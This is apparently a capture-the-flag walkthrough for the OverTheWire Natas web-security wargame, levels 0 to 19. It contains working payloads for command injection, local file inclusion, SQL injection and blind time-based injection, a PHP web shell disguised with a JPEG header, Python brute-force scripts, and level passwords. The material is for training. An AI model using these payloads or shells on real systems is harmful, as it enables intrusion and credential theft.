## Natas - the basics of serverside web-security vulnerabilities

### natas0

Step 1: F12 -> Inspector

```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

### natas1

Step 1: View page source (Ctrl + U)

```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```
### natas2

Step 1: View page source

```html
...
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
...
```

Step 2: Access to `files/pixel.png` -> Back to `files`

```html
...
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2016-12-20 05:15  </td><td align="right">145 </td><td>&nbsp;</td></tr>
...
```

Step 3: Access to `users.txt`

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

### natas3

Step 1: View page source

```html
...
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
...
```

Step 2: The `robots.txt` file on a webpage tells search engines which directories not to enter.
We try access to `robots.txt`

```
User-agent: *
Disallow: /s3cr3t/
```

Step 3: Access to `/s3cr3t/`

```html
...
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2016-12-20 05:15  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
...
```

Step 4: Access to `users.txt`

```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

### natas4

```
...
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
...
```

Step 1: F12 to inspect `Request Headers`

```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas4.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Step 2: Burp Repeater -> Change `Referer: http://natas5.natas.labs.overthewire.org/`

```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

### natas5

```html
Access disallowed. You are not logged in</div>
```

Step 1: inspect response

```
HTTP/1.1 200 OK
Date: Fri, 04 Mar 2022 16:14:39 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Length: 855
Connection: close
Content-Type: text/html; charset=UTF-8
```

Step 2: Burp Repeater -> Add header `Cookie: loggedin=1`

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

### natas6

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

We need find `$secret`, then post this value to form to pass the condition `$secret == $_POST['secret']`. The `$secret` variable wasn't declared in `index.php`, but `index.php` include `includes/secret.inc`.

Step 1: Access `includes/secret.inc`

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Step 2: Submit secret=FOEIUWGHFEEUHOFUOIU

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

### natas7

This is LFI, we can change param `?page=/etc/natas_webpass/natas8`. This is leads `index.php` includes `/etc/natas_webpass/natas8` and show off password.

```html
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

### natas8

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

We can decode `$secret`, then post this value to form.

```php
echo hex2bin("3d3d516343746d4d6d6c315669563362");
// ==QcCtmMml1ViV3b
strrev("==QcCtmMml1ViV3b");
// b3ViV1lmMmtCcQ==
base64_decode("b3ViV1lmMmtCcQ==");
// oubWYf2kBq
```

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

### natas9

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Because `$key` isn't validated, we can inject cli into `$key`. 
The payload is `'123' dictionary.txt; cat /etc/natas_webpass/natas10`

```
Output:
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

African
Africans
...
```

### natas10

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Some certain characters was filtered, but we can use another payload look like `'' /etc/natas_webpass/natas11`

```
Output:
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:
dictionary.txt:African
dictionary.txt:Africans
...
```

### natas11

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>
```

```php
<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Step 1: inspect response, we can see cookie.

```
Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

The `cookie` value is set by `XOR($defaultdata, $key)`. If `"showpassword"=>"no"`, we don't see the password. So we need to change the `cookie` with `"showpassword"=>"yes"`.

Because we have `cookie` value and `$defaultdata`, we can compute `XOR($defaultdata, cookie)` to find `$key` (XOR property: A xor B = C => A xor C = B).

Finally, we compute `XOR($new_data, $key)`, note that we need to chage `$new_data` with `"showpassword"=>"yes"`.

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
echo json_encode($defaultdata);
// {"showpassword":"no","bgcolor":"#ffffff"}
echo base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
// b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
```

Step 2: We create `natas11.py` to generate new cookie.

```python
#!/usr/bin/python3
import base64

data = '{"showpassword":"no","bgcolor":"#ffffff"}'
xoring = base64.b64decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=')

print('data:', data)
print('xoring:', xoring)

key = []
for i in range(len(xoring)):
    c = xoring[i] ^ ord(data[i])
    print('char of key:', c)
    if c not in key:
        key.append(c)

print('key:', key)

cookie = ''
data = '{"showpassword":"yes","bgcolor":"#ffffff"}'
for i in range(len(data)):
    cookie += chr(key[i % len(key)] ^ ord(data[i]))

print('cookie:', base64.b64encode(cookie.encode()))
```

```
python3 natas11.py

data: {"showpassword":"no","bgcolor":"#ffffff"}
xoring: b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
char of key: 119
char of key: 56
char of key: 74
char of key: 113
key: [113, 119, 56, 74]
cookie: b'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
```

Step 3: Burp Repeater -> Change `Cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

```html
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
```

### natas12

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
```

This is Unrestricted File Upload from client-side. We can change `.jpg` to `.php` in `<input>` of html, then upload `shell.php` file to excute some tasks.

```php
<?php // shell.php
$data = system($_GET["cmd"]);
echo $data;
?>  
```

After upload file, we can see:

```php
Notice: Undefined index: cmd in /var/www/natas/natas12/upload/tb0heduy1x.php on line 2

Warning: system(): Cannot execute a blank command in /var/www/natas/natas12/upload/tb0heduy1x.php on line 2
```

Add param into url `?cmd=cat /etc/natas_webpass/natas13`.

```
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

### natas13

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?> 
```

When we upload `.php` file, the response is `"File is not an image` because the function `exif_imagetype`. This method only reads the first bytes of an image and checks its signature. For details file signature, you can visit [`here`](https://filesignatures.net/index.php?search=jpg&mode=EXT). So we can inject php code to somewhere in image, as long as not in the first bytes.

We create the `shell.php` with first bytes is \xFF\xD8\xFF\xE0 (JPG's signature) by using `shell_image.py` look like following:

```python
# shell_image.py
f = open('shell.php', 'w')
f.write('\xFF\xD8\xFF\xE0' + '\t' + '<?php $data=system($_GET["cmd"]); echo $data;?>')
f.close()
```
When try open `shell.php`:

```php
ÿØÿà    <?php $data=system($_GET["cmd"]); echo $data;?>
```

After upload `shell.php`, we can see:

```php
����
Notice: Undefined index: cmd in /var/www/natas/natas13/upload/2i08bhv52e.php on line 1

Warning: system(): Cannot execute a blank command in /var/www/natas/natas13/upload/2i08bhv52e.php on line 1
```

Add param into url `?cmd=cat /etc/natas_webpass/natas14`, we can get the password natas14

```
���� Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

### natas14

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?> 
```

This is sql injection, when we fill `"` into `username` input, response contain error:

```php
Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
Access denied!
```

Change payload `natas15" or 1=1 -- -` and fill into `username` input:

```
 Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

### natas15

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?> 
```

Try fill `natas16` into username input, we get the response `This user exists.` So we use sql injection to find password of natas16.
The payload look like that: SELECT * from users where username="`natas16" and password="abcxyz`".

If `mysql_num_rows($res) > 0` -> correct password -> `This user exists.`, else wrong password -> `This user doesn't exist.`

We need inject sql to find char by char password, so we use `substring()` in sql.


Step 1: Brute-force length password

```
username=natas16%22+and+length(password)+=+%22§6§ -> Check response `This user exists.` -> Length of password is 32.
```

Step 2: Brute-force char by char password

```
username=natas16%22+and+substring(password,§1§,1)+=+%22§a§ -> Check response `This user exists.` -> waiheacj63wnnibroheqi3p9t0m5nhmh
```

??? But SQL case-insentive, char by char is upper or lower???

Step 3: Brute-force binary char:

```
username=natas16%22+and+substring(password,§1§,1)+LIKE+BINARY+%22§w§ -> Check response `This user exists.` -> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

This following python code `natas15.py`:

```python
#!/usr/bin/python3
import requests
from string import ascii_lowercase, digits

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

# brute-force length
for i in range(100):
    uri = '{}?username=natas16%22+and+length(password)+=+%22{}'.format(url, i)
    r = requests.get(uri, auth=(auth_username,auth_password))
    if 'This user exists.' in r.text:
        length = i
        print('password length:', i)
        break

characters = ascii_lowercase + digits
print('characters:', characters)

# brute-force char
password_lower = ''
for i in range(length):
    for char in characters:
        uri = '{}?username=natas16%22+and+substring(password,{},1)+=+%22{}'.format(url, i+1, char)
        r = requests.get(uri, auth=(auth_username,auth_password))
        if 'This user exists.' in r.text:
            password_lower += char
            break

# fix case-insentive
password = ''
for i, char in enumerate(password_lower):
    uri = '{}?username=natas16%22+and+substring(password,{},1)+LIKE+BINARY+%22{}'.format(url, i+1, char)
    r = requests.get(uri, auth=(auth_username,auth_password))
    if 'This user exists.' in r.text:
        password += char
    else:
        password += char.upper()
    print('password:', password)
```

```
python3 natas15.py

password length: 32
characters: abcdefghijklmnopqrstuvwxyz0123456789
password: W
password: Wa
password: WaI
password: WaIH
password: WaIHE
password: WaIHEa
password: WaIHEac
password: WaIHEacj
password: WaIHEacj6
password: WaIHEacj63
password: WaIHEacj63w
password: WaIHEacj63wn
password: WaIHEacj63wnN
password: WaIHEacj63wnNI
password: WaIHEacj63wnNIB
password: WaIHEacj63wnNIBR
password: WaIHEacj63wnNIBRO
password: WaIHEacj63wnNIBROH
password: WaIHEacj63wnNIBROHe
password: WaIHEacj63wnNIBROHeq
password: WaIHEacj63wnNIBROHeqi
password: WaIHEacj63wnNIBROHeqi3
password: WaIHEacj63wnNIBROHeqi3p
password: WaIHEacj63wnNIBROHeqi3p9
password: WaIHEacj63wnNIBROHeqi3p9t
password: WaIHEacj63wnNIBROHeqi3p9t0
password: WaIHEacj63wnNIBROHeqi3p9t0m
password: WaIHEacj63wnNIBROHeqi3p9t0m5
password: WaIHEacj63wnNIBROHeqi3p9t0m5n
password: WaIHEacj63wnNIBROHeqi3p9t0m5nh
password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

### natas16

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Some certain characters was filtered, but we can use `$()` command in GNU to create payload:

`$(grep -E ^§a§.* /etc/natas_webpass/natas17)African`, -E is regex.

With above playload, first the application run `$(grep -E ^§a§.* /etc/natas_webpass/natas17)African`, return `'abcxyzAfrican'`, then run `$(grep -i 'abcxyzAfrican' dictionary.txt)`.

Because `'African'` is one word in dictionary.txt, if first command return `None` -> the second command run `$(grep -i 'African' dictionary.txt)` and show dictionary.

Vice versa, if first command return `123456African` -> the second command return `None`, because the word `123456African` isn't in dictionary.txt and don't show dictionary. Then we can confirm that `123456` is part of the password. Next we will use blind injection to get full password.

This following python code `natas16.py`:

```python
#!/usr/bin/python3
import requests
from string import ascii_letters, digits

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

characters = ascii_letters + digits
print('characters:', characters)

password = ''

for i in range(35):
    for char in characters:
        uri = "{}?needle=$(grep -E ^{}{}.* /etc/natas_webpass/natas17)African".format(url, password, char)
        r = requests.get(uri, auth=(auth_username,auth_password))
        if 'African' not in r.text:
            password += char
            print('password:', password)
            break
        else: 
            continue
```

```
python3 natas16.py

characters: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
password: 8
password: 8P
password: 8Ps
password: 8Ps3
password: 8Ps3H
password: 8Ps3H0
password: 8Ps3H0G
password: 8Ps3H0GW
password: 8Ps3H0GWb
password: 8Ps3H0GWbn
password: 8Ps3H0GWbn5
password: 8Ps3H0GWbn5r
password: 8Ps3H0GWbn5rd
password: 8Ps3H0GWbn5rd9
password: 8Ps3H0GWbn5rd9S
password: 8Ps3H0GWbn5rd9S7
password: 8Ps3H0GWbn5rd9S7G
password: 8Ps3H0GWbn5rd9S7Gm
password: 8Ps3H0GWbn5rd9S7GmA
password: 8Ps3H0GWbn5rd9S7GmAd
password: 8Ps3H0GWbn5rd9S7GmAdg
password: 8Ps3H0GWbn5rd9S7GmAdgQ
password: 8Ps3H0GWbn5rd9S7GmAdgQN
password: 8Ps3H0GWbn5rd9S7GmAdgQNd
password: 8Ps3H0GWbn5rd9S7GmAdgQNdk
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

### natas17

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?> 
```

This is blind SQL injection, we don't know about information of response in browser. So we will try blind SQL injection with time delays.

Step 1: Test payload

```
username=natas18%22+and+sleep(3)%23 -> time response=3 -> user natas18 exists.
```

Step 2: Brute-force length password

```
username=natas18%22+and+length(password)%3d§32§+and+sleep(3)%23 -> Length password = 32.
```

Step 3: Brute-force password char by char

```
username=natas18%22+and+substring(password,§1§,1)+like+binary+%22§a§%22+and+sleep(3)%23 -> 
```

This following python code `natas17.py`:

```python
#!/usr/bin/python3
import requests
from string import ascii_letters, digits

url = "http://natas17.natas.labs.overthewire.org/index.php"
auth_username = "natas17"
auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

# brute-force length
for i in range(100):
    uri = '{}?username=natas18%22+and+length(password)%3d{}+and+sleep(3)%23'.format(url, i)
    r = requests.get(uri, auth=(auth_username,auth_password))
    if r.elapsed.total_seconds() > 3:
        length = i
        print('password length:', i)
        break

characters = ascii_letters + digits
print('characters:', characters)

# brute-force char
password = ''
for i in range(length):
    for char in characters:
        uri = '{}?username=natas18%22+and+substring(password,{},1)+like+binary+%22{}%22+and+sleep(3)%23'.format(url, i+1, char)
        r = requests.get(uri, auth=(auth_username,auth_password))
        if r.elapsed.total_seconds() > 3:
            password += char
            print('password:', password)
            break
```

```
python3 natas17.py

('password length:', 32)
('characters:', 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
('password:', 'x')
('password:', 'xv')
('password:', 'xvK')
('password:', 'xvKI')
('password:', 'xvKIq')
('password:', 'xvKIqD')
('password:', 'xvKIqDj')
('password:', 'xvKIqDjy')
('password:', 'xvKIqDjy4')
('password:', 'xvKIqDjy4O')
('password:', 'xvKIqDjy4OP')
('password:', 'xvKIqDjy4OPv')
('password:', 'xvKIqDjy4OPv7')
('password:', 'xvKIqDjy4OPv7w')
('password:', 'xvKIqDjy4OPv7wC')
('password:', 'xvKIqDjy4OPv7wCR')
('password:', 'xvKIqDjy4OPv7wCRg')
('password:', 'xvKIqDjy4OPv7wCRgD')
('password:', 'xvKIqDjy4OPv7wCRgDl')
('password:', 'xvKIqDjy4OPv7wCRgDlm')
('password:', 'xvKIqDjy4OPv7wCRgDlmj')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0p')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pF')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFs')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsC')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCs')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsD')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDj')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd')
('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
```

### natas18

```php
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?> 
```

When login with any username and password, we can see the response:

```
POST /index.php HTTP/1.1
Host: natas18.natas.labs.overthewire.org
Content-Length: 27
Cache-Control: max-age=0
Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==
Upgrade-Insecure-Requests: 1
Origin: http://natas18.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas18.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=273
Connection: close

username=test&password=test
```

The random session was created, and `PHPSESSID=273` is set in cookie. Because the maximum of `PHPSESSID` is `640`. So we can brute-force 640 times to find the PHPSESSID of admin. This following python code `natas18.py`: 

```python
import requests

url = "http://natas18.natas.labs.overthewire.org/"
auth_username = "natas18"
auth_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

for i in range(641):
    r = requests.get(url, auth=(auth_username, auth_password), cookies={'PHPSESSID': str(i)})
    if i == 0:
        request_length = len(r.content)
    if len(r.content) != request_length:
        print('admin id:', i)
        break
    request_length = len(r.content)
```

```
python3 natas18.py

('admin id:', 119)
```

Using `curl` to set cookie `PHPSESSID=119`:

```shell
curl --user natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/ --cookie "PHPSESSID=119"
```

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

### natas19

```
This page uses mostly the same code as the previous level, but session IDs are no longer sequential... 
```

